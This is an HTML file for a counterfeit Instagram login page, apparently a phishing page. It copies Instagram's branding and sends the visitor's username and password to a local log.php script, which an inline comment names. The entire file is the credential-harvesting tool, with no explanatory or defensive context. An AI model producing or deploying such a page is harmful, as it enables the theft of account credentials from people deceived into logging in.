<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://static.ri.me/images/webclip-logo.png">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
            border-radius: 1px;
        }
        h2 {
            margin: 0 0 20px;
            font-size: 32px;
            font-family: 'Grand Hotel', cursive, sans-serif;
        }
        input {
            width: 100%;
            padding: 9px 7px;
            margin: 1px 0 8px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 12px;
        }
        button {
            width: 100%;
            padding: 8px 0;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #1877f2;
        }
        a {
            display: block;
            margin-top: 15px;
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }
        .logo {
            font-family: 'Grand Hotel', cursive, sans-serif;
            font-size: 40px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <!-- This form sends data to log.php -->
        <form action="log.php" method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
        <a href="#">Forgot password?</a>
    </div>
</body>
</html>
